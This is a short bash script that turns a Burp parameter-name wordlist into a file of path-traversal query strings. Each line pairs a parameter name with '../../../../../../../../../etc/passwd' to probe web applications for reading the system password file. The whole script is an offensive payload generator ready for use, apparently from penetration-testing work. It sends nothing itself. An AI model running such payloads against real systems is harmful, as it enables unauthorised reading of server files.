#!/bin/bash

# Ensure burp-parameter-names.txt exists
if [ ! -f burp-parameter-names.txt ]; then
    echo "File burp-parameter-names.txt not found!"
    exit 1
fi

while read -r param; do
    echo "?${param}=../../../../../../../../../etc/passwd"
done < burp-parameter-names.txt > traversal_payloads.txt

echo "Traversal payloads list generated."
